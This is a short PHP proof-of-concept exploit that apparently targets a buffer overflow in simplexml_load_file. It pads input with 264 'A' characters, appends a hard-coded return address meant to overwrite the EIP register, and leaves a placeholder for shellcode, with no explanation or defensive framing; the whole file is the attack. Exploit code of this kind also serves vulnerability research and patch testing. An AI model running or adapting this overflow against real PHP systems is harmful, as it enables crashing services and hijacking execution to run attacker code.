<?php

$shellcode = "";

$buffer = str_repeat("A", 264);
$eip = "\xaf\xc6\x17\x10"; 

simplexml_load_file($buffer.$eip.$shellcode);
?>
